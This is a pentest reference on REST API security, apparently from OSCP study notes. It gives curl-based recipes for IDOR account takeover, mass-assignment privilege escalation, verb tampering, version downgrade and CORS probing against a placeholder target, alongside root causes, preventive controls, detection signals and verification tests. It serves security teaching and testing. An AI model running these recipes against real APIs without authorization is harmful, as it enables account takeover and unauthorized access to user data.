jg# REST API Security

> API category - 02 REST
> REST (Representational State Transfer) is the most common API style: HTTP methods on resource URLs, JSON payloads, stateless by design.
> It is a primary source of IDOR, mass assignment, broken authentication, and versioning-based access control gaps.
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

---

## Table of Contents

- [1. What REST Is](#1-what-rest-is)
- [2. Detection](#2-detection)
- [3. Enumeration](#3-enumeration)
- [4. Attack Surface Map](#4-attack-surface-map)
- [5. Common Variants](#5-common-variants)
- [6. Exploitation Recipes](#6-exploitation-recipes)
- [7. Post-Exploitation](#7-post-exploitation)
- [8. Risk Context (AppSec)](#8-risk-context-appsec)
- [9. Root Causes (AppSec)](#9-root-causes-appsec)
- [10. Preventive Controls (AppSec)](#10-preventive-controls-appsec)
- [11. Detection Controls (AppSec)](#11-detection-controls-appsec)
- [12. Verification (AppSec)](#12-verification-appsec)
- [13. OSCP Notes](#13-oscp-notes)
- [14. Production Notes](#14-production-notes)
- [15. References](#15-references)

---

## 1. What REST Is

REST is an architectural style, not a protocol. The defining constraints:

- **Client-server** - the UI is decoupled from the data store.
- **Stateless** - each request carries all the information the server needs. No server-side session by default.
- **Cacheable** - responses declare their cacheability.
- **Uniform interface** - resources are identified by URLs, manipulated through representations (usually JSON), and driven by a fixed set of methods.
- **Layered** - the client does not know whether it talks to the origin server or to a gateway/proxy.

**Practical consequence for pentest:** every request must be self-authenticating (token in header, cookie, or query). That is why REST APIs are a common source of:

- Token leakage (URLs get logged, Referer headers leak).
- IDOR (object IDs in the URL, no ownership check).
- Mass assignment (the framework binds every JSON field to the model).
- Version drift (v1 still reachable after v3 is current).

**Common stacks:** Express (Node), FastAPI/Flask/Django REST (Python), Spring Boot (Java), ASP.NET Web API (C#), Rails (Ruby), Laravel (PHP), Gin/Echo (Go).

---

## 2. Detection

REST APIs are everywhere. Look for:

- URLs like `/api/v1/`, `/api/v2/`, `/rest/`, `/json/`, `/data/`.
- `Content-Type: application/json` in requests/responses.
- `Accept: application/json` in requests.
- HTTP methods beyond GET/POST: PUT, PATCH, DELETE, OPTIONS.
- API version in the path (`/v1/`) or in a header (`Accept: application/vnd.api+json`).
- Swagger/OpenAPI UI at `/swagger`, `/swagger-ui`, `/api-docs`, `/openapi.json`, `/v2/api-docs`, `/v3/api-docs`.

### Quick detection

```bash
# OPTIONS enumeration (allowed methods per endpoint)
curl -s -X OPTIONS "$TARGET/api/" -i | grep -i allow

# Swagger / OpenAPI discovery
for p in /swagger /swagger-ui /swagger-ui.html /swagger-ui/index.html \
         /api-docs /openapi.json /v2/api-docs /v3/api-docs /swagger.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$p")
  [ "$code" != "404" ] && echo "$code  $p"
done
```

Expected output:

```text
200  /api-docs
200  /openapi.json
```

### Response header hints (app stack, not the DBMS)

```bash
curl -s -I "$TARGET/api/v1/health"
```

Look for: `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Runtime`. These identify the application stack, not the database. Do not infer the DBMS from headers alone.

---

## 3. Enumeration

### Endpoint discovery from the spec

If Swagger/OpenAPI is exposed, the entire API is documented:

```bash
curl -s "$TARGET/openapi.json" | jq '.paths | keys[]'
```

Expected output:

```text
"/api/v1/users"
"/api/v1/users/{id}"
"/api/v1/admin/backup"
```

`/api/v1/admin/backup` in the spec but not linked from the UI is a common shadow endpoint.

### Wordlist-based enumeration

```bash
ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403
```

### Method enumeration

For each discovered endpoint, enumerate allowed methods:

```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" "$TARGET/api/v1/users")
  echo "$m  $code"
done
```

A `200` on `DELETE` where the UI only exposes `GET` is a finding.

### Version enumeration

```bash
for v in v1 v2 v3 v4 beta internal legacy; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/$v/users")
  echo "$v  $code"
done
```

Old versions often have weaker auth, missing rate limits, or unpatched CVEs.

---

## 4. Attack Surface Map

| Surface | What to test |
|---------|--------------|
| Object identifiers | Sequential IDs, UUIDs, slugs - can you read another user's object? |
| Mass assignment | Extra fields in POST/PATCH - do they persist? |
| Method tampering | DELETE/PUT/PATCH where only GET/POST is exposed |
| Versioning | Old `/v1/` still reachable with weaker controls |
| Auth token | Where is it stored? Is it in URL? Does it expire? |
| CORS | `Access-Control-Allow-Origin` reflection + credentials |
| Rate limit | Login, OTP, password reset |
| Error verbosity | Stack traces, SQL errors, internal paths |
| Batching | JSON arrays, bulk endpoints - can you bypass per-item checks? |

---

## 5. Common Variants

### 5.1 BOLA / IDOR

Broken Object Level Authorization. The endpoint receives an object ID and returns the object without checking ownership.

```bash
# Own resource
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/1042"

# Peer resource (same role, different user)
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/1043"
```

If the second returns the same shape as the first - BOLA.

**Covered in:** `08 Vulnerabilities/IDOR.md` (general technique).

### 5.2 Mass Assignment

The framework binds every JSON field to the model. Send fields the UI never sends.

```bash
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"new@example.com","role":"admin","is_verified":true}' \
  "$TARGET/api/v1/users/me"
```

If `role` or `is_verified` persist - mass assignment.

**Covered in:** `08 Vulnerabilities/Mass-Assignment.md`.

### 5.3 Method Tampering

The developer protected GET but not DELETE:

```bash
curl -s -X DELETE -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/1042"
```

Try every method against every endpoint. `OPTIONS` returns the allowed set, but the server may accept more than it advertises.

### 5.4 Version Drift

`/api/v1/` was replaced by `/api/v3/` in the UI but is still reachable. v1 often lacks the newer auth checks.

```bash
for v in v1 v2 v3; do
  echo "== $v =="
  curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $TOKEN" "$TARGET/api/$v/users/1043"
done
```

If v1 returns `200` while v3 returns `403` for the same peer ID - the older version is the weaker one.

### 5.5 Excessive Data Exposure

The endpoint returns more than the UI displays:

```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/me" | jq
```

Look for: `password_hash`, `api_key`, `internal_notes`, `ssn`, `is_admin`, `created_by`.

### 5.6 Verbose Errors

Trigger a server-side error and read the response:

```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/notanumber"
```

Stack traces reveal framework versions, file paths, and sometimes DB credentials.

---

## 6. Exploitation Recipes

### 6.1 IDOR to account takeover

```bash
# 1. Read peer object
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/1043" | jq

# 2. Change peer object (PATCH allowed?)
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@example.com"}' \
  "$TARGET/api/v1/users/1043"

# 3. Trigger password reset on the new email (attacker-controlled)
```

### 6.2 Mass assignment to privilege escalation

```bash
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' \
  "$TARGET/api/v1/users/me"

# Verify
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/admin/users" | jq
```

### 6.3 Verb tampering to bypass auth middleware

Some middleware only checks the method it knows about:

```bash
# UI uses GET; DELETE is unprotected
curl -s -X DELETE -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/1043"

# Or: HEAD may bypass body-scanning WAFs
curl -s -I "$TARGET/api/v1/admin/users"
```

### 6.4 Version downgrade to bypass auth

```bash
# v3 requires auth
curl -s "$TARGET/api/v3/users/1043"
# 401

# v1 does not
curl -s "$TARGET/api/v1/users/1043" | jq
# 200 with the object
```

### 6.5 CORS reflection to steal tokens

```bash
curl -s -H "Origin: https://attacker.example" -I "$TARGET/api/v1/users/me" | grep -i access-control
```

If `Access-Control-Allow-Origin: https://attacker.example` and `Access-Control-Allow-Credentials: true` are both present, a browser page on `attacker.example` can read authenticated responses.

---

## 7. Post-Exploitation

After a REST API foothold:

- Enumerate the OpenAPI spec again with the new privilege level - the spec does not change, but the reachable subset does.
- Check for admin-only endpoints (`/api/v1/admin/*`) now that you are admin.
- Look for internal endpoints that are not exposed at the gateway but reachable from the application container (e.g. `http://localhost:8080/api/internal/`).
- Test token lifetime: does a token survive a password change? A role change? A logout?
- Check `X-Forwarded-For` / `X-Real-IP` handling - can you bypass IP allowlists?

---

## 8. Risk Context (AppSec)

REST API vulnerabilities are a governance problem as much as a code problem.

- **Regulatory:** an IDOR that exposes PII triggers GDPR/CCPA notification requirements.
- **Blast radius:** a single mass-assignment bug in a `PATCH /users/me` endpoint can affect every account.
- **Auditability:** REST APIs are often missing the logging that the UI layer has - a BOLA read leaves no trace.
- **Third-party exposure:** if the API is consumed by partners, a version-drift bug affects every integration simultaneously.

---

## 9. Root Causes (AppSec)

| Root cause | Where it originates |
|------------|---------------------|
| Object ID trusted from the client | Controllers pass `params[:id]` straight to the model |
| Framework auto-binding | Rails `strong_params` misconfigured, Spring `@ModelAttribute` on user object |
| Missing method check | Route definition allows a method the controller does not guard |
| Version lifecycle | Old routers not removed after migration |
| Token in URL | Session design copied from the browser world |
| Error verbosity | Framework debug mode left on |
| CORS `*` + credentials | Cookie design + permissive CORS |

---

## 10. Preventive Controls (AppSec)

- **Ownership check on every object access.** Not in the controller - in the data layer. `SELECT ... WHERE id = ? AND owner_id = ?`.
- **Allowlist, not denylist, for bindable fields.** Rails `permit(:email, :name)`, Spring `@JsonProperty(access = WRITE_ONLY)` on sensitive fields.
- **Explicit HTTP method per route.** Reject `OPTIONS` at the gateway if you do not need it. Do not expose `DELETE` unless the route needs it.
- **Version lifecycle policy.** When v3 ships, remove v1 from the gateway, not just from the UI.
- **Tokens in headers, never URLs.** `Authorization: Bearer ...` with short TTL + refresh rotation.
- **Generic error responses.** No stack traces, no framework names, no internal paths.
- **CORS:** explicit allowlist of origins. Never `*` with `credentials: true`.
- **Rate limit at the gateway, not in the controller.** Controllers are hit before the rate limit if the check is in code.
- **Log every authorization decision.** A BOLA read should be visible in the access log.

---

## 11. Detection Controls (AppSec)

| Signal | Where to look |
|--------|---------------|
| 403/401 ratio spikes per user | Gateway access logs |
| Sequential object access (1042, 1043, 1044) | Application logs |
| Unusual method usage (DELETE where only GET is typical) | Gateway logs |
| Version prefix requests after deprecation | Gateway logs |
| Mass-assignment field names in payloads (`role`, `is_admin`) | WAF + application logs |
| Token in URL query string | Gateway access logs |
| CORS preflight from unexpected origins | Gateway logs |

Alert thresholds should be tuned per endpoint: a `/users/me` endpoint never sees sequential IDs, a `/products/{id}` endpoint does.

---

## 12. Verification (AppSec)

How to know the controls work:

- **BOLA:** with two test accounts, read peer object. Expect 403 (not 404 - do not leak existence).
- **Mass assignment:** PATCH with `role: admin`. Expect 400 or silent drop, never persist.
- **Method tampering:** `OPTIONS` returns the route's methods. Every other method returns 405.
- **Version drift:** `/v1/` returns 410 Gone after deprecation.
- **CORS:** preflight from `https://evil.example` returns no `Access-Control-Allow-Origin`.
- **Token lifetime:** after password change, old token returns 401 within the TTL window.
- **Rate limit:** N requests in T seconds trigger 429.

Automate the checks as integration tests. A BOLA regression test is two lines in any HTTP client.

---

## 13. OSCP Notes

REST APIs appear on OSCP boxes as:

- A `/api/` endpoint behind a login form. After login, enumerate with the session cookie.
- A hidden Swagger UI (`/api-docs`) that documents undocumented endpoints.
- A v1/v2 split where v1 has no auth.

For the report, screenshot the request and response of the BOLA proof. OffSec expects a clear "user A reads user B's data" demonstration.

---

## 14. Production Notes

- **Never run `ffuf` against a production API without explicit permission.** Rate limits are there for a reason; bypassing them is a DoS.
- **Mass-assignment tests write data.** Use `PATCH /users/me` on a throwaway account, not on a real one.
- **Version enumeration can trip alerting.** Coordinate with the blue team.
- **Token extraction:** if a token appears in a URL, it is in the gateway log. Treat it as compromised.

---

## 15. References

- OWASP API Security Top 10:2023 - API1 (BOLA), API3 (Mass Assignment), API5 (Function Level) - https://owasp.org/API-Security/editions/2023/en/0x00-header/
- OWASP REST Security Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
- OWASP Mass Assignment Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- PortSwigger API testing - https://portswigger.net/web-security/api-testing
- OWASP WSTG - API Testing - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/